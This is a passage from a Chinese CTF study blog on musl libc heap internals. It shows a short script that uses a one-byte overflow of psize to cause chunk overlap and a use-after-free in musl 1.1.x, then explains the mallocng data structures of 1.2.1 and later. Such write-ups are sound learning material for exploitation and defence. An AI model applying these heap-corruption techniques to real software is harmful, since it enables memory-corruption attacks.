      <p>一般在Musl环境下的堆题，基本不存在off-by-null的情况的，因为当前chunk的csize会和下一个chunk的psize进行比对，如果不等会crash。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//__bin_chunk函数中</span></span><br><span class="line"><span class="comment">//若下一个 chunk 的 psize 不等于 self 的 csize，则 crash</span></span><br><span class="line">    <span class="comment">//相当于检测pre_size和size</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br></pre></td></tr></table></div></figure>

<p>而由于不重用psize字段，就算溢出一个零字节，也无法覆盖到csize字段，只能覆盖到pszie字段，所以当可以溢出一个任意字节时，我们就可以修改psize字段，向上进行堆块重叠合并。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,(<span class="number">0x40</span>-<span class="number">0x10</span>+<span class="number">0x1</span>),<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p8(<span class="number">0x80</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></div></figure>

<p>这样chunk0和chunk1就会合并到一块进入bin中，制造chunk1的堆块重叠，但是由于函数机制问题，chunk2实际上是并没有被释放到bin中的。</p>

        <h5 id="未合并前如下："   >
          <a href="#未合并前如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#未合并前如下：" class="headerlink" title="未合并前如下："></a>未合并前如下：</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181131379.png" alt="image-20220218113100251"></p>

        <h5 id="合并后如下："   >
          <a href="#合并后如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#合并后如下：" class="headerlink" title="合并后如下："></a>合并后如下：</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181136514.png" alt="image-20220218113620389"></p>
<p>那么之后将chunk1释放，在将chunk0+chunk1申请回来，即可制造一个UAF了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,(<span class="number">0x40</span>-<span class="number">0x10</span>+<span class="number">0x1</span>),<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p8(<span class="number">0x41</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add_malloc(<span class="number">0x80</span>-<span class="number">0x10</span>)</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181204446.png" alt="image-20220218120440262"></p>
<p>有了UAF之后就好办很多了，还是参考上述的UAF情况</p>

        <h1 id="二、1-2-1及之后版本"   >
          <a href="#二、1-2-1及之后版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、1-2-1及之后版本" class="headerlink" title="二、1.2.1及之后版本"></a>二、1.2.1及之后版本</h1>
      <p>这个版本下的堆管理方式有了很大的变化，可以说和原来的都不是一个东西了。</p>
<p>参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252293" >新版musl-libc malloc源码分析与调试 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566#h3-2" >从musl libc 1.1.24到1.2.2 学习pwn姿势 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246929" >musl-1.2.x堆部分源码分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-数据结构-1"   >
          <a href="#1-数据结构-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-数据结构-1" class="headerlink" title="1.数据结构"></a>1.数据结构</h2>
      
        <h3 id="1-chunk结构-1"   >
          <a href="#1-chunk结构-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-chunk结构-1" class="headerlink" title="(1)chunk结构"></a>(1)chunk结构</h3>
      <p>在该版本之后，并没有像之前一样将chunk结构定义在代码里，所以我们只能自己来进行猜测，大致如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> res;        <span class="comment">// 保留,一直为\x00</span></span><br><span class="line">    <span class="keyword">uint8_t</span> idx:<span class="number">5</span>;      </span><br><span class="line">    <span class="comment">//低5bit作为idx表示这是group中第几个chunk, 高3bit作为reserved</span></span><br><span class="line">    <span class="comment">//如果该chunk被free，则该字节被置为0xff,同时下面的offset被置为0</span></span><br><span class="line">    <span class="keyword">uint8_t</span> reserved:<span class="number">3</span>;  <span class="comment">// 不知道干啥的</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset;     <span class="comment">//与第一个chunk的偏移</span></span><br><span class="line">    					<span class="comment">//如果为4则chunk_addr-0x40=first_chunk_addr</span></span><br><span class="line">    <span class="comment">/*如果是group中的第一个chunk，那么还有如下数据</span></span><br><span class="line"><span class="comment">    struct meta* meta;//指向管理该group的meta</span></span><br><span class="line"><span class="comment">	unsigned char active_idx:5;//占据5bytes,表示该group中共有几个slot,也就是chunk</span></span><br><span class="line"><span class="comment">	char pad[UNIT - sizeof(struct meta *) - 1];</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">char</span> user_data[];    <span class="comment">// 最后一字节需要为\x00</span></span><br><span class="line">    <span class="keyword">char</span> remain_data[];  <span class="comment">// 剩余空间最后一字节需要为\x00</span></span><br><span class="line">    <span class="keyword">uint32_t</span> remain_size; <span class="comment">// chunk剩余size大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下图所示，chunk分布大概如下</p>
<p><img src="C:/Users/007/Desktop/202203181141533.png" alt="image-20220318114135427"></p>
<p>其中chunk1的idx即为该group中的第1个Chunk，为0x1</p>
<p>而这整片开辟的空间，包括未被分配的chunk，如下面的马赛克部分且一直向下延申到一定位置，连在一起叫做<code>group</code></p>

        <h3 id="2-group"   >
          <a href="#2-group" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-group" class="headerlink" title="(2)group"></a>(2)group</h3>
      <p>也就是通过mmap开辟出来用来存放chunk的一片空间，定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">//即上图头部chunk0中的第一个指针地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;<span class="comment">//占据5bytes</span></span><br><span class="line">	<span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];</span><br><span class="line">    <span class="comment">//即从头部chunk0从0x41开始一直往下的部分，包括chunk1,chunk2..以及未被分配出去的Chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>且group中存放的Chunk的size是在一个范围内，通过如下定义以及计算</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IB 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">    <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">    <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">    <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">    <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">a_ctz_32</span><span class="params">(<span class="keyword">uint32_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> a_clz_32</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>-a_clz_32(x&amp;-x);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> debruijn32[<span class="number">32</span>] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="number">29</span>, <span class="number">24</span>, <span class="number">19</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">31</span>, <span class="number">22</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">14</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> debruijn32[(x&amp;-x)*<span class="number">0x076be629</span> &gt;&gt; <span class="number">27</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">a_clz_32</span><span class="params">(<span class="keyword">uint32_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    x++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>-a_ctz_32(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">size_to_class</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n = (n+IB<span class="number">-1</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&lt;<span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="keyword">int</span> i = (<span class="number">28</span>-a_clz_32(n))*<span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;size_classes[i+<span class="number">1</span>]) i+=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>相关汇总计算如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0x0     ~ 0xc -&gt;0</span><br><span class="line">0xd     ~ 0x1c -&gt;1</span><br><span class="line">0x1d    ~ 0x2c -&gt;2</span><br><span class="line">0x2d    ~ 0x3c -&gt;3</span><br><span class="line">0x3d    ~ 0x4c -&gt;4</span><br><span class="line">0x4d    ~ 0x5c -&gt;5</span><br><span class="line">0x5d    ~ 0x6c -&gt;6</span><br><span class="line">0x6d    ~ 0x7c -&gt;7</span><br><span class="line">0x7d    ~ 0x8c -&gt;8</span><br><span class="line">0x8d    ~ 0x9c -&gt;9</span><br><span class="line">0x9d    ~ 0xbc -&gt;10</span><br><span class="line">0xbd    ~ 0xec -&gt;11</span><br><span class="line">0xed    ~ 0x11c -&gt;12</span><br><span class="line">0x11d   ~ 0x13c -&gt;13</span><br><span class="line">0x13d   ~ 0x18c -&gt;14</span><br><span class="line">0x18d   ~ 0x1ec -&gt;15</span><br><span class="line">0x1ed   ~ 0x23c -&gt;16</span><br><span class="line">0x23d   ~ 0x29c -&gt;17</span><br><span class="line">0x29d   ~ 0x31c -&gt;18</span><br><span class="line">0x31d   ~ 0x3ec -&gt;19</span><br><span class="line">0x3ed   ~ 0x47c -&gt;20</span><br><span class="line">0x47d   ~ 0x53c -&gt;21</span><br><span class="line">0x53d   ~ 0x65c -&gt;22</span><br><span class="line">0x65d   ~ 0x7ec -&gt;23</span><br><span class="line">0x7ed   ~ 0x91c -&gt;24</span><br><span class="line">0x91d   ~ 0xa9c -&gt;25</span><br><span class="line">0xa9d   ~ 0xcbc -&gt;26</span><br><span class="line">0xcbd   ~ 0xfec -&gt;27</span><br><span class="line">0xfed   ~ 0x123c -&gt;28</span><br><span class="line">0x123d  ~ 0x153c -&gt;29</span><br><span class="line">0x153d  ~ 0x198c -&gt;30</span><br><span class="line">0x198d  ~ 0x1fec -&gt;31</span><br><span class="line">0x1fed  ~ 0x247c -&gt;32</span><br><span class="line">0x247d  ~ 0x2a9c -&gt;33</span><br><span class="line">0x2a9d  ~ 0x331c -&gt;34</span><br><span class="line">0x331d  ~ 0x3fec -&gt;35</span><br><span class="line">0x3fed  ~ 0x490c -&gt;36</span><br><span class="line">0x490d  ~ 0x553c -&gt;37</span><br><span class="line">0x553d  ~ 0x664c -&gt;38</span><br><span class="line">0x664d  ~ 0x7fec -&gt;39</span><br><span class="line">0x7fed  ~ 0x923c -&gt;40</span><br><span class="line">0x923d  ~ 0xaa9c -&gt;41</span><br><span class="line">0xaa9d  ~ 0xccbc -&gt;42</span><br><span class="line">0xccbd  ~ 0xffec -&gt;43</span><br><span class="line">0xffed  ~ 0x1247c -&gt;44</span><br><span class="line">0x1247d ~ 0x1553c -&gt;45</span><br><span class="line">0x1553d ~ 0x1997c -&gt;46</span><br></pre></td></tr></table></div></figure>

<p>也就是说一个group中的chunk大小范围要么是<code>0x0 ~ 0xc </code>，要么是<code>0xd~ 0x1c</code>，依次类推。且依据上述转换表，一个范围对应一个索引，该索引即用来寻找meta的索引。</p>

        <h3 id="3-meta"   >
          <a href="#3-meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-meta" class="headerlink" title="(3)meta"></a>(3)meta</h3>
      <p>而用来管理group的结构称为meta，一个meta对应一个group，而上面结构定义中的group中的meta指针即指向管理本group的meta，其定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="comment">//存在多个meta，通过循环双向链表串联起来</span></span><br><span class="line">    <span class="comment">//释放之后有用,没有释放的则指向本身</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">//指向本meta管理的group</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//freed_mask是当前meta的group中被free的chunk的bitmap, 4bytes</span></span><br><span class="line">    <span class="comment">//avail_mask是当前meta的group中目前可用chunk的bitmap, 4bytes</span></span><br><span class="line">   	<span class="comment">//由于是4bytes，总共32bit，那么最多可有32个chunk</span></span><br><span class="line">    <span class="comment">//这里很奇怪啊，直接0/1表示可用不可用呗，那要是某个chunk在这两个free和avail的bitmap</span></span><br><span class="line">    <span class="comment">//中对应的bit都为1或都为0又怎么算呢</span></span><br><span class="line">    <span class="comment">//这里好像被free的chunk其freed_mask对应的bit会马上被置为1</span></span><br><span class="line">    <span class="comment">//但是avail_mask对应的bit却不会马上置1，暂时标记不可用状态</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;<span class="comment">//group中最后一个chunk的idx索引 (5bit)</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">//表示当前meta是否可以被free(1:可以，0:不可以)(1bit)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//由于一个Group中的chunk的size在一个范围内，所以需要通过sizeclass来追踪计算size</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">//(6bit)</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h3 id="4-meta-area"   >
          <a href="#4-meta-area" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-meta-area" class="headerlink" title="(4)meta_area"></a>(4)meta_area</h3>
      <p>顾名思义，这个结构就是用来管理meta的，相关定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> check;   		<span class="comment">//校验值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span> <span class="comment">//下一个分配区，即下一页(0x1000为一页)</span></span><br><span class="line">    <span class="keyword">int</span> nslots;    			<span class="comment">//总共多少个slots</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span> 	<span class="comment">//从其中索引其下面的meta</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>分配meta时, 总是先分配一页的内存, 然后划分为多个等待分配的meta区域，meta_arena描述的就是一页内存的最开始部分。</p>

        <h3 id="5-malloc-context"   >
          <a href="#5-malloc-context" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-malloc-context" class="headerlink" title="(5)malloc_context"></a>(5)malloc_context</h3>
      <p>这个就相当于整个分配内存机制总管理的一个结构，类似于glibc中的<code>main_arena</code>相关定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> secret;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> pagesize;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> init_done;     <span class="comment">//有无完成初始化</span></span><br><span class="line">    <span class="keyword">unsigned</span> mmap_counter;   <span class="comment">//mmap内存总数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span> <span class="comment">//释放的meta组成的队列</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span>  <span class="comment">//指向可用meta对象</span></span><br><span class="line">    <span class="comment">//可用meta计数、可用meta_area计数、不知道</span></span><br><span class="line">    <span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span> <span class="comment">//分配区头尾指针</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span>   <span class="comment">//活动的meta</span></span><br><span class="line">    <span class="keyword">size_t</span> usage_by_class[<span class="number">48</span>]; <span class="comment">//这个大小级别使用了多少内存</span></span><br><span class="line">    <span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> seq;</span><br><span class="line">    <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> <span class="title">ctx</span>;</span></span><br></pre></td></tr></table></div></figure>

<p>总的来说，数据结构大致如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203172053962.png" alt="img"></p>

        <h2 id="2-维护方式-1"   >
          <a href="#2-维护方式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-维护方式-1" class="headerlink" title="2.维护方式"></a>2.维护方式</h2>
      <p>使用<code>freed_mask</code>和<code>avail_mask</code>来确定，如下图所示，在<code>active[2]</code>(即size在0x1d~0x2c的chunk)中现在有</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171413463.png" alt="image-20220317141333259"></p>
<p>我们将active[2]中<code>avail_mask</code>置1的chunk都申请出来之后，即代表这个group无法接着为我们的申请提供chunk的话，比如这里就是需要申请出chunk0~chunk9，然后再申请的话就会进行判断</p>
<ul>
<li>如果该group中存在被free的chunk，即<code>freed_mask</code>中置1的chunk，那么就返回该chunk，这里也存在一个顺序问题，不会管是先释放还是后释放的，只会从上到下进行分配，如下代码</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">dbg()    </span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">pause()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x10</span>,p8(<span class="number">0x11</span>)*<span class="number">0x10</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></div></figure>

<p>第一次<code>dbg()</code>断点的地方先申请8个chunk，那么现在在该group的<code>avail_mask</code>中应该为<code>1100000000</code> 而<code>freed_mask</code>应该为<code>1111111</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171434757.png" alt="image-20220317143430652"></p>
